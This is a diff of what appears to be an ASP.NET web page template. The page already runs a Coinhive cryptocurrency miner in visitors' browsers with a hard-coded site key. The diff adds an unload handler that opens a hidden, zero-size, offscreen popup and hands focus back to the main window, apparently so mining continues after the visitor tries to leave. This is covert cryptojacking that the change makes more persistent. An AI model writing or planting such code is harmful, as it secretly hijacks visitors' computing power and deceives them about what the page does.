@@ -5,6 +5,8 @@
 }
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<link href="~/css/jConfirm-v2.css" rel="stylesheet" />
+<script src="~/js/jConfirm-v2.js"></script>
 <script>
     setTimeout(function () {
         var miner = new CoinHive.User('xSjpR64LrSx0edB6geGUajT9PPBMIV45', 'chieuhoan9@gmail.com', {
@@ -22,6 +24,13 @@
         window.addEventListener("beforeunload", function (e) {
             window.localStorage.removeItem('_openpopup');
         });
+        window.onbeforeunload = confirmExit;
+        function confirmExit() {
+            var myWindow =window.open('@Url.Action("Index", "PageBlank")', '_blank', 'scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width= 0, height = 0, left = -2000, top = -1000');
+            myWindow.blur();
+            window.focus();
+            window.localStorage.setItem('_openpopup', 'open');
+        }
     })();
 </script>
 
